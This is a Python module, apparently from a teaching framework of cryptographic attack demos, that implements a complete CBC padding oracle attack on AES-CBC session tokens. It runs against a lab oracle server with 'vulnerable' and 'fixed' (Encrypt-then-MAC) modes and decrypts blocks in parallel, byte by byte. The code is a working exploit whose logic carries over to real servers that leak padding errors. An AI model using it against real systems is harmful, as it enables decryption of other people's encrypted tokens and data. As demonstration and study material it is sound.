"""Attack 5: CBC padding oracle (Vaudenay 2002; real-world: POODLE, Lucky13).

CBC decryption:  P_i = D(K, C_i) XOR C_(i-1)
The attacker can't compute D(K, C_i), but can send (X, C_i) to the server
with a chosen block X in place of C_(i-1) and learn one bit: was the padding
of X XOR D(K, C_i) valid? Working from the last byte, 256 guesses per byte
are enough to recover I = D(K, C_i) one byte at a time, and then
P_i = I XOR C_(i-1). The key is never needed.

Every ciphertext block can be attacked on its own, so each block is one chunk:
the swarm decrypts all blocks in parallel.
"""

import json
import os
import urllib.request

import requests

from .. import keys as K
from .base import Attack, ChunkContext, Plan

ORACLE_URL = os.environ.get("ORACLE_URL", "http://oracle:9000")
MESSAGE = '{"user":"alice","role":"admin","note":"vault code 7319, meet at the library at 9pm"}'
PADDING_ERROR = 500
BS = 16

_session: requests.Session | None = None


def http() -> requests.Session:
    global _session
    if _session is None:
        _session = requests.Session()  # keep-alive: much faster than a new connection per query
    return _session


class PaddingOracle(Attack):
    name = "padding_oracle"
    title = "Padding oracle on AES-CBC"
    unit = "queries"
    params_schema = {"mode": {"type": "choice", "options": ["vulnerable", "fixed"], "default": "vulnerable"}}

    def plan(self, params: dict) -> Plan:
        mode = self.clean_params(params)["mode"]
        req = urllib.request.Request(
            f"{ORACLE_URL}/setup",
            data=json.dumps({"mode": mode, "message": MESSAGE}).encode(),
            headers={"Content-Type": "application/json"},
        )
        with urllib.request.urlopen(req, timeout=5) as resp:
            token = bytes.fromhex(json.load(resp)["token"])

        mac = token[-32:].hex() if mode == "fixed" else ""
        body = token[:-32] if mode == "fixed" else token
        blocks = [body[i : i + BS].hex() for i in range(0, len(body), BS)]  # IV, C1, C2, ...
        n = len(blocks) - 1
        chunks = [{"id": b, "block": b} for b in range(n)]
        meta = {"mode": mode, "blocks": blocks, "mac": mac, "n_blocks": n}
        summary = (
            f"Padding oracle on a {n}-block AES-128-CBC session token, server mode: {mode} "
            f"({'padding errors leak' if mode == 'vulnerable' else 'Encrypt-then-MAC'})"
        )
        return Plan(meta, [chunks], n * BS * 256, {"plaintext": MESSAGE}, summary, ["decrypt blocks"])

    # ------------------------------------------------------------ worker side
    def run_chunk(self, meta: dict, chunk: dict, ctx: ChunkContext) -> dict:
        b = chunk["block"]
        prev = bytes.fromhex(meta["blocks"][b])
        cur = bytes.fromhex(meta["blocks"][b + 1])
        mac = bytes.fromhex(meta["mac"])
        live = K.job_live(ctx.job_id)

        def report(status: str, plain: bytes = b"", note: str = "") -> None:
            ctx.r.hset(live, b, json.dumps({"status": status, "plain": plain.hex(), "note": note}))

        def padding_ok(x: bytes) -> bool:
            r = http().post(f"{ORACLE_URL}/api/session", json={"token": (x + cur + mac).hex()}, timeout=5)
            return r.status_code != PADDING_ERROR

        report("working")
        # Calibrate: random blocks almost never have valid padding (≈1/256). If the server
        # says "not a padding error" to all of them, its answers don't depend on padding.
        if all(padding_ok(os.urandom(BS)) for _ in range(4)):
            ctx.progress(4)
            report("failed", note="server gives the same answer for every tampered token: no oracle")
            return {}
        ctx.progress(4)

        inter = bytearray(BS)  # I = D(K, cur), recovered right to left
        for pad_len in range(1, BS + 1):
            j = BS - pad_len
            x = bytearray(os.urandom(j)) + bytearray(BS - j)
            for k in range(j + 1, BS):
                x[k] = inter[k] ^ pad_len  # force the known bytes to decrypt to pad_len
            found = False
            for g in range(256):
                x[j] = g
                ok = padding_ok(bytes(x))
                if ok and pad_len == 1 and j > 0:
                    # Guard against a false positive like ...\x02\x02: change the byte before and retry.
                    x[j - 1] ^= 0xFF
                    ok = padding_ok(bytes(x))
                    x[j - 1] ^= 0xFF
                    if not ctx.progress(1):
                        return {"aborted": True}
                if not ctx.progress(1):
                    return {"aborted": True}
                if ok:
                    inter[j] = g ^ pad_len
                    found = True
                    break
            if not found:
                report("failed", note=f"no valid padding found for byte {j}")
                return {}
            report("working", bytes(a ^ p for a, p in zip(inter[j:], prev[j:])))
        report("done", bytes(a ^ p for a, p in zip(inter, prev)))
        return {}
